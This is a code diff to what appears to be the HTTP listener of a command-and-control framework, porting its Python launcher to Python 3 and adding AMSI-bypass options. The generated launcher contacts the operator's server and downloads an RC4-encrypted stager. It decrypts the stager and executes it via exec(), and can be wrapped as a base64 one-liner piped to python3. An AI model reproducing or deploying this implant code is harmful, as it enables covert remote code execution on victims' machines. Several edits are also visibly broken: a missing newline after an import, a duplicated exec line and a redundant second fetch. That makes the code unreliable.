@@ -236,7 +236,7 @@ class Listener:
 
 
     def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None,
-                          stager=None, scriptLogBypass=None):
+                          stager=None, scriptLogBypass=None, AMSIBypass=True, AMSIBypass2=False):
         """
         Generate a basic launcher for the specified listener.
         """
@@ -404,7 +404,8 @@ class Listener:
                 # Python
 
                 # ==== HANDLE IMPORTS ====
-                launcherBase = 'import sys,urllib,urllib2,base64\n'
+                launcherBase = 'import sys,base64\n'
+                launcherBase += 'import urllib.request as urllib'
 
                 # ==== HANDLE SSL ====
                 if profile.stager.client.scheme == "https":
@@ -424,25 +425,25 @@ class Listener:
                 # ==== CONFIGURE PROXY ====
                 if proxy and proxy.lower() != 'none':
                     if proxy.lower() == 'default':
-                        launcherBase += "proxy = urllib2.ProxyHandler()\n"
+                        launcherBase += "proxy = urllib.ProxyHandler()\n"
                     else:
                         proto = proxy.split(':')[0]
-                        launcherBase += "proxy = urllib2.ProxyHandler({'"+proto+"':'"+proxy+"'})\n"
+                        launcherBase += "proxy = urllib.ProxyHandler({'"+proto+"':'"+proxy+"'})\n"
                     if proxyCreds and proxyCreds != 'none':
                         if proxyCreds == 'default':
-                            launcherBase += "o = urllib2.build_opener(proxy)\n"
+                            launcherBase += "o = urllib.build_opener(proxy)\n"
                         else:
-                            launcherBase += "proxy_auth_handler = urllib2.ProxyBasicAuthHandler()\n"
+                            launcherBase += "proxy_auth_handler = urllib.ProxyBasicAuthHandler()\n"
                             username = proxyCreds.split(':')[0]
                             password = proxyCreds.split(':')[1]
                             launcherBase += "proxy_auth_handler.add_password(None,'"+proxy+"','"+username+"','"+password+"')\n"
-                            launcherBase += "o = urllib2.build_opener(proxy, proxy_auth_handler)\n"
+                            launcherBase += "o = urllib.build_opener(proxy, proxy_auth_handler)\n"
                     else:
-                        launcherBase += "o = urllib2.build_opener(proxy)\n"
+                        launcherBase += "o = urllib.build_opener(proxy)\n"
                 else:
-                    launcherBase += "o = urllib2.build_opener()\n"
+                    launcherBase += "o = urllib.build_opener()\n"
                 # install proxy and creds globaly, so they can be used with urlopen.
-                launcherBase += "urllib2.install_opener(o)\n"
+                launcherBase += "urllib.install_opener(o)\n"
 
                 # ==== BUILD AND STORE METADATA ====
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON', meta='STAGE0', additional='None', encData='')
@@ -450,7 +451,7 @@ class Listener:
                 profile.stager.client.store(routingPacketTransformed, profile.stager.client.metadata.terminator)
 
                 # ==== BUILD REQUEST ====
-                launcherBase += "vreq=type('vreq',(urllib2.Request,object),{'get_method':lambda self:self.verb if (hasattr(self,'verb') and self.verb) else urllib2.Request.get_method(self)})\n"
+                launcherBase += "vreq=type('vreq',(urllib.Request,object),{'get_method':lambda self:self.verb if (hasattr(self,'verb') and self.verb) else urllib.Request.get_method(self)})\n"
                 launcherBase += "req=vreq('%s', '%s')\n" % (profile.stager.client.url, profile.stager.client.body)
                 launcherBase += "req.verb='"+profile.stager.client.verb+"'\n"
 
@@ -459,7 +460,7 @@ class Listener:
                     launcherBase += "req.add_header('%s','%s')\n" % (header, value)
 
                 # ==== SEND REQUEST ====
-                launcherBase += "res=urllib2.urlopen(req)\n"
+                launcherBase += "res=urllib.urlopen(req)\n"
 
                 # ==== INTERPRET RESPONSE ====
                 if profile.stager.server.output.terminator.type == malleable.Terminator.HEADER:
@@ -473,27 +474,32 @@ class Listener:
                 launcherBase += profile.stager.server.output.generate_python_r("a")
 
                 # ==== EXTRACT IV AND STAGER ====
-                launcherBase += "IV=a[0:4];data=a[4:]\n"
-                launcherBase += "key=IV+'%s'\n" % (stagingKey)
+                launcherBase += "a=urllib.urlopen(req).read();\n"
+                launcherBase += "IV=a[0:4];"
+                launcherBase += "data=a[4:];"
+                launcherBase += "key=IV+'%s'.encode('UTF-8');" % (stagingKey)
 
                 # ==== DECRYPT STAGER (RC4) ====
-                launcherBase += "S,j,out=range(256),0,[]\n"
-                launcherBase += "for i in range(256):\n"
-                launcherBase += "    j=(j+S[i]+ord(key[i%len(key)]))%256\n"
+                launcherBase += "S,j,out=list(range(256)),0,[]\n"
+                launcherBase += "for i in list(range(256)):\n"
+                launcherBase += "    j=(j+S[i]+key[i%len(key)])%256\n"
                 launcherBase += "    S[i],S[j]=S[j],S[i]\n"
                 launcherBase += "i=j=0\n"
                 launcherBase += "for char in data:\n"
                 launcherBase += "    i=(i+1)%256\n"
                 launcherBase += "    j=(j+S[i])%256\n"
                 launcherBase += "    S[i],S[j]=S[j],S[i]\n"
-                launcherBase += "    out.append(chr(ord(char)^S[(S[i]+S[j])%256]))\n"
+                launcherBase += "    out.append(chr(char^S[(S[i]+S[j])%256]))\n"
+                launcherBase += "exec(''.join(out))"
 
                 # ==== EXECUTE STAGER ====
-                launcherBase += "exec(''.join(out))\n"
+                launcherBase += "exec(''.join(out))"
 
                 if encode:
-                    launchEncoded = base64.b64encode(launcherBase)
-                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | /usr/bin/python &" % (launchEncoded)
+                    launchEncoded = base64.b64encode(launcherBase.encode('UTF-8')).decode('UTF-8')
+                    if isinstance(launchEncoded, bytes):
+                        launchEncoded = launchEncoded.decode('UTF-8')
+                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | python3 &" % (launchEncoded)
                     return launcher
                 else:
                     return launcherBase
@@ -560,6 +566,11 @@ class Listener:
             stager = stager.replace("/index.php", stage2)
 
             randomizedStager = ''
+            # forces inputs into a bytestring to ensure 2/3 compatibility
+            stagingKey = stagingKey.encode('UTF-8')
+            # stager = stager.encode('UTF-8')
+            # randomizedStager = randomizedStager.encode('UTF-8')
+
             for line in stager.split("\n"):
                 line = line.strip()
                 # skip commented line
@@ -577,7 +588,7 @@ class Listener:
                 return helpers.enc_powershell(randomizedStager)
             elif encrypt:
                 RC4IV = os.urandom(4)
-                return RC4IV + encryption.rc4(RC4IV+stagingKey, randomizedStager)
+                return RC4IV + encryption.rc4(RC4IV + stagingKey, randomizedStager.encode('UTF-8'))
             else:
                 return randomizedStager
 
@@ -604,7 +615,7 @@ class Listener:
                 return base64.b64encode(stager)
             elif encrypt:
                 RC4IV = os.urandom(4)
-                return RC4IV + encryption.rc4(RC4IV+stagingKey, stager)
+                return RC4IV + encryption.rc4(RC4IV + stagingKey.encode('UTF-8'), stager.encode('UTF-8'))
             else:
                 return stager
 
@@ -896,7 +907,7 @@ class Listener:
                 sendMessage += "    global headers\n"
                 sendMessage += "    global taskURIs\n"
 
-                sendMessage += "    vreq = type('vreq', (urllib2.Request, object), {'get_method':lambda self:self.verb if (hasattr(self, 'verb') and self.verb) else urllib2.Request.get_method(self)})\n"
+                sendMessage += "    vreq = type('vreq', (urllib.Request, object), {'get_method':lambda self:self.verb if (hasattr(self, 'verb') and self.verb) else urllib.Request.get_method(self)})\n"
 
                 # ==== BUILD POST ====
                 sendMessage += "    if packets:\n"
@@ -980,7 +991,7 @@ class Listener:
 
                 # ==== SEND REQUEST ====
                 sendMessage += "    try:\n"
-                sendMessage += "        res = urllib2.urlopen(req)\n"
+                sendMessage += "        res = urllib.urlopen(req)\n"
 
                 # ==== EXTRACT RESPONSE ====
                 if profile.get.server.output.terminator.type == malleable.Terminator.HEADER:
@@ -996,12 +1007,12 @@ class Listener:
                 sendMessage += "        return ('200', data)\n"
 
                 # ==== HANDLE ERROR ====
-                sendMessage += "    except urllib2.HTTPError as HTTPError:\n"
+                sendMessage += "    except urllib.HTTPError as HTTPError:\n"
                 sendMessage += "        missedCheckins += 1\n"
                 sendMessage += "        if HTTPError.code == 401:\n"
                 sendMessage += "            sys.exit(0)\n"
                 sendMessage += "        return (HTTPError.code, '')\n"
-                sendMessage += "    except urllib2.URLError as URLError:\n"
+                sendMessage += "    except urllib.URLError as URLError:\n"
                 sendMessage += "        missedCheckins += 1\n"
                 sendMessage += "        return (URLError.reason, '')\n"
 
